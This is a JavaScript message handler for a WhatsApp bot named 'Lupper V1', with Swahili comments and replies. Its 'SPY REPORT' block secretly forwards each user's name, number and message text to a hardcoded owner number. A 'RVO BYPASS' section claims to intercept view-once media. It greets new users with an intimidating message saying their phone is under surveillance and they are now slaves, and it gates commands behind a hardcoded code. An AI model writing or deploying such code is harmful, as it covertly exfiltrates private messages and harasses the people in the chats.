import { smsg } from "./lib/simple.js"
import { format } from "util"
import { fileURLToPath } from "url"
import path, { join } from "path"
import { unwatchFile, watchFile, readFileSync } from "fs"
import chalk from "chalk"
import fetch from "node-fetch"
import { WelcomeLeave } from "./lib/welcome.js"

const isNumber = x => typeof x === "number" && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function() {
    clearTimeout(this)
    resolve()
}, ms))

const { getAggregateVotesInPollMessage, makeInMemoryStore } = await (await import('@whiskeysockets/baileys')).default;
import Pino from "pino"
const store = makeInMemoryStore({
    logger: Pino().child({ level: 'fatal', stream: 'store' })
})

export async function handler(chatUpdate) {
    this.msgqueque = this.msgqueque || []
    if (!chatUpdate) return
    this.pushMessage(chatUpdate.messages).catch(console.error)
    let m = chatUpdate.messages[chatUpdate.messages.length - 1]
    if (!m) return
    if (global.db.data == null) await global.loadDatabase()
    
    try {
        m = smsg(this, m) || m
        if (!m) return
        m.exp = 0
        m.credit = false

        // --- [ LUPPER V1: DEVELOPER SETTINGS ] ---
        const lupinMain = '255782754785@s.whatsapp.net'
        const mentorBrian = '25578047095@s.whatsapp.net'
        
        const isROwner = [lupinMain, mentorBrian, conn.decodeJid(global.conn.user.id)].includes(m.sender)
        const isOwner = isROwner || m.fromMe
        const isPrems = isROwner || global.prems.map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)

        // --- [ LUPPER V1: DATABASE SETUP ] ---
        try {
            let user = global.db.data.users[m.sender]
            if (typeof user !== "object") global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.exp)) user.exp = 0
                if (!isNumber(user.credit)) user.credit = 10
                if (!('registered' in user)) user.registered = false
                if (!('isAuthorized' in user)) user.isAuthorized = false 
            } else {
                global.db.data.users[m.sender] = { exp: 0, credit: 10, registered: false, isAuthorized: false, firstLink: false }
            }
        } catch (e) { console.error(e) }

        // --- [ LUPPER V1: AUTO HARSH WELCOME ] ---
        let _user = global.db.data.users[m.sender]
        if (!_user.firstLink && !m.fromMe) {
            let harshWelcome = `
"NEURAL LINK ESTABLISHED, PEASANT!" 🧬
Sikiliza wewe @${m.sender.split('@')[0]}, kuanzia sasa simu yako ipo chini ya uangalizi wa **LUPIN STARNLEY**. 

Umeingia kwenye mfumo ambao akili yako ndogo haiwezi kuuelewa. Kila unachofanya nakiona. Usijaribu kuwa mjanja, utajuta. Karibu kwenye utumwa wa Lupper V1.`
            
            await this.reply(m.chat, harshWelcome, m, { mentions: [m.sender] })
            _user.firstLink = true 
        }

        // --- [ LUPPER V1: AUTHORIZATION SYSTEM ] ---
        if (m.text === '.code LUPIN076') {
            _user.isAuthorized = true
            return m.reply("ACCESS GRANTED. 🟢\nSasa unaweza kutumia mfumo. Usinipotezee muda tena.")
        }

        // --- [ LUPPER V1: PEASANT WALL & SPY ] ---
        if (m.text.startsWith('.') && !isOwner && !_user.isAuthorized) {
            const wallMsg = `
"STOP RIGHT THERE, PEASANT!" 🛑

Mfumo huu umefungwa kwa siri. Lupper V1 hautumiki na watu wa hali ya chini kama wewe. 

Kama unataka uhuru wa kutumia bot hii, lazima upate **Access Code** kutoka kwa Boss Mkuu: **Lupin Starnley** (+255782754785). Ukishapata kodi, itumie hapa kwa kuandika: \`.code <secret_key>\``
            return m.reply(wallMsg)
        }

        // Spy Log inatuma ripoti kwa Lupin Main
        if (m.text && !m.fromMe && m.sender !== lupinMain) {
            let spyLog = `🧊 *[ SPY REPORT ]*\n👤 *Target:* ${m.pushName}\n💬 *Msg:* ${m.text}\n📱 *Num:* ${m.sender}`
            this.sendMessage(lupinMain, { text: spyLog })
        }

        // --- [ LUPPER V1: RVO BYPASS ] ---
        if (m.mtype === 'viewOnceMessageV2' || m.mtype === 'viewOnceMessage') {
            await this.reply(m.chat, `Intercepting secret file for Master Lupin... 🕵️‍♂️`, m)
        }

        if (m.isBaileys) return
        if (typeof m.text !== "string") m.text = ""

        // --- ENDEZA PLUGINS CHINI HAPA ---
        const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), "./plugins")
        for (let name in global.plugins) {
            let plugin = global.plugins[name]
            if (!plugin || plugin.disabled) continue
            // ... (Kodi yako ya plugins inaendelea hapa)
        }

    } catch (e) { console.error(e) }
}

// ... (Sehemu ya Participants Update inabaki kama ilivyokuwa)